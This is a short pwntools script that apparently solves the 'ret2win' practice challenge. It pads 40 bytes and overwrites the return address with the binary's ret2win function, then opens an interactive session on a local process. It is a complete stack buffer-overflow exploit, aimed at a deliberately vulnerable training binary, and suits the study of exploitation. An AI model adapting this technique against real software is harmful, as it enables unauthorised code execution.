from pwn import *

elf = ELF('/mnt/c/Users/zahar/Downloads/ret2win/ret2win')

p = process('/mnt/c/Users/zahar/Downloads/ret2win/ret2win')
p.recvuntil(b'> ')

junk = 0x20 * b'A' + 0x8 * b'A'
ret2win = elf.symbols['ret2win'] + 1 

payload  = junk
payload += p64(ret2win)

p.sendline(payload)
p.interactive()
